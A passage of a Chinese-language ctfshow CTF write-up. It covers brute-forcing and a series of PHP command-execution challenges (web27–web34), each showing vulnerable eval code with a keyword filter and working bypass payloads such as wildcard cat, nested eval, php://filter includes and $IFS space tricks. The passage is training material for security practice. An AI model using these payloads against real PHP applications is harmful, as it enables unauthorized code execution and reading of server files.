data-src=\"C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230113000127515.png\" alt=\"image-20230113000127515\" /></p>\n<p>爆破出来后发现 msg 是 url 编码，解码后得到线索 “恭喜您，您已被我校录取，你的学号刷初始密码为身份证号码”</p>\n<p><img data-src=\"C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230113000406494.png\" alt=\"image-20230113000406494\" /></p>\n<p><img data-src=\"C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230113000512890.png\" alt=\"image-20230113000512890\" /></p>\n<p><img data-src=\"C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230113000536995.png\" alt=\"image-20230113000536995\" /></p>\n<p>登陆得到 flag</p>\n<pre><code>ctfshow&#123;2ccb2be2-6545-441a-8b16-070d6395726a&#125;\n</code></pre>\n<h2 id=\"web28\"><a class=\"anchor\" href=\"#web28\">#</a> web28</h2>\n<p>大海捞针</p>\n<pre><code>题目提示：\n通过暴力破解目录/0-100/0-100/看返回数据包\n爆破的时候去掉2.txt 仅仅爆破目录即可\n</code></pre>\n<p>根据提示，只需要爆破目录即可，burpsutie 抓包选中变量，去掉 2.txt，将模式改成 Cluster bomb (集束炸弹)<img data-src=\"C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230113001905754.png\" alt=\"image-20230113001905754\" /></p>\n<p>之后设置 payload1，payload2 同理，设置完后开始爆破<img data-src=\"C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230113002013624.png\" alt=\"image-20230113002013624\" /></p>\n<p><img data-src=\"C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230113002039465.png\" alt=\"image-20230113002039465\" /></p>\n<p><img data-src=\"C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230113002107014.png\" alt=\"image-20230113002107014\" /></p>\n<p>查看状态栏的升序看到个 200，得到 flag</p>\n<pre><code>ctfshow&#123;bb330eeb-0827-42c2-be2e-8a942cbc3b1c&#125;\n</code></pre>\n<h1 id=\"命令执行\"><a class=\"anchor\" href=\"#命令执行\">#</a> 命令执行</h1>\n<h2 id=\"web29\"><a class=\"anchor\" href=\"#web29\">#</a> web29</h2>\n<p>命令执行，需要严格的过滤</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-09-04 00:12:34</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-09-04 00:26:48</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/flag/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>首先先代码审计</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/flag/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>i是不区分大小写，preg_match函数过滤掉flag</pre></td></tr></table></figure><p>我们可以用通配符输出 flag</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>payload：</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">?</span>c<span class=\"token operator\">=</span><span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'cat f*'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><pre><code>ctfshow&#123;9d6e8252-afda-45d3-a707-c71cc83c5f38&#125;\n</code></pre>\n<h2 id=\"web30\"><a class=\"anchor\" href=\"#web30\">#</a> web30</h2>\n<p>命令执行，需要严格的过滤</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-09-04 00:12:34</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-09-04 00:42:26</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/flag|system|php/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>这次是 flag、system、php 被过滤掉了</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>命令执行函数</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">passthru</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">exec</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token function\">shell_exec</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token function\">popen</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token function\">proc_open</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token function\">pcntl_exec</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>反引号 同<span class=\"token function\">shell_exec</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>payload：</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">?</span>c<span class=\"token operator\">=</span><span class=\"token keyword\">echo</span> <span class=\"token function\">exec</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'cat f*'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><pre><code>ctfshow&#123;285ab479-be6c-4880-9ec9-254b3c17ca90&#125;\n</code></pre>\n<h2 id=\"web31\"><a class=\"anchor\" href=\"#web31\">#</a> web31</h2>\n<p>命令执行，需要严格的过滤</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-09-04 00:12:34</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-09-04 00:49:10</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/flag|system|php|cat|sort|shell|\\.| |\\'/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>这次过滤掉了 cat|sort|shell、点和单引号</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>payload1：</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>c<span class=\"token operator\">=</span><span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span>a<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>a<span class=\"token operator\">=</span><span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'cat f*'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">// 嵌套 eval 绕过 preg_match 函数</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>payload2：</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token operator\">?</span>c<span class=\"token operator\">=</span><span class=\"token keyword\">include</span><span class=\"token string double-quoted-string\">\"<span class=\"token interpolation\"><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span>url<span class=\"token punctuation\">]</span></span>\"</span><span class=\"token operator\">?</span><span class=\"token operator\">></span><span class=\"token operator\">&amp;</span>url<span class=\"token operator\">=</span>php<span class=\"token punctuation\">:</span><span class=\"token comment\">//filter/read=convert.base64-encode/resource=flag.php</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">// 利用 include 结合伪协议包含读取</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"9\"></td><td><pre>payload3：</pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token operator\">?</span>c<span class=\"token operator\">=</span><span class=\"token function\">passthru</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"tac<span class=\"token interpolation\"><span class=\"token variable\">$09f</span></span>*\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>passthru 直接读取</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>$09 代替空格</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>payload4<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token operator\">?</span>c<span class=\"token operator\">=</span><span class=\"token function\">passthru</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"tac\\$IFS\\$09f*\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token comment\">//$IFS$09 结合绕过空格</span></pre></td></tr></table></figure><pre><code>ctfshow&#123;8fae6aeb-110e-42fe-81fe-d74ee49c1e52&#125;\n</code></pre>\n<h2 id=\"web32\"><a class=\"anchor\" href=\"#web32\">#</a> web32</h2>\n<p>命令执行，需要严格的过滤</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-09-04 00:12:34</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-09-04 00:56:31</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>点、空格、单引号、反单引号、echo、分号、括号都过滤掉了（过滤 sssss）</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>payload1<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">?</span>c<span class=\"token operator\">=</span><span class=\"token keyword\">include</span><span class=\"token string double-quoted-string\">\"<span class=\"token interpolation\"><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span>url<span class=\"token punctuation\">]</span></span>\"</span><span class=\"token operator\">?</span><span class=\"token operator\">></span><span class=\"token operator\">&amp;</span>url<span class=\"token operator\">=</span>php<span class=\"token punctuation\">:</span><span class=\"token comment\">//filter/read=convert.base64-encode/resource=flag.php</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">// 利用 include 结合伪协议包含读取</span></pre></td></tr></table></figure><pre><code>ctfshow&#123;d8264780-aefd-4fe8-a561-fea3b300a63b&#125;\n</code></pre>\n<h2 id=\"web33\"><a class=\"anchor\" href=\"#web33\">#</a> web33</h2>\n<p>命令执行，需要严格的过滤</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-09-04 00:12:34</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-09-04 02:22:27</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(|\\\"/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>过滤升级，添加了双引号</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>payload<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">?</span>c<span class=\"token operator\">=</span><span class=\"token keyword\">include</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span>url<span class=\"token punctuation\">]</span><span class=\"token operator\">?</span><span class=\"token operator\">></span><span class=\"token operator\">&amp;</span>url<span class=\"token operator\">=</span>php<span class=\"token punctuation\">:</span><span class=\"token comment\">//filter/read=convert.base64-encode/resource=flag.php</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">// 利用 include 结合伪协议包含读取</span></pre></td></tr></table></figure><pre><code>ctfshow&#123;0c229e04-4fd2-45b7-9ca7-66887b0a11c7&#125;\n</code></pre>\n<h2 id=\"web34\"><a class=\"anchor\" href=\"#web34\">#</a> web34</h2>\n<p>命令执行，需要严格的过滤</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-09-04 00:12:34</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-09-04 04:21:29</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token 